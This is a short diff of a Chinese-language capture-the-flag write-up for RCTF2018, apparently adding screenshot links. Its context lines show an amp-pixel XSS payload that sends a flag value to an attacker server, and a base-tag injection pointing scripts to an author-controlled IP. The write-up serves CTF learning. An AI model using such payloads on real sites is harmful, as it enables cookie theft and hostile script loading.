@@ -98,7 +98,7 @@ payload:`url?name=<amp-pixel src="http://my_server/?q=CLIENT_ID(FLAG)"></amp-pix
 再按下`STOP TRACKING ME`的按鈕之後  
 就會得到：`?q=RCTF%7BEl_PsY_CONGRO0_sg-%7d`  
 GET FLAG!!  
-![]()  
+![](https://github.com/shinmao/CTF-writeups/blob/master/RCTF2018/screenshot/amp.png)  
 
 # Web - r-cursive
 
@@ -140,7 +140,7 @@ Missing base-uri allows the injection of base tags. They can be used to set the 
 
 Exploit：  
 `title`部分輸入`<base href="http://18.216.228.129:8080/" />`，此ip為我可控的server  
-![]()  
+![](https://github.com/shinmao/CTF-writeups/blob/master/RCTF2018/screenshot/rblog.png)  
 創建`http://18.216.228.129:8080/assets/js/jquery.min.js`，內容為:  
 ```php
 function hello(){
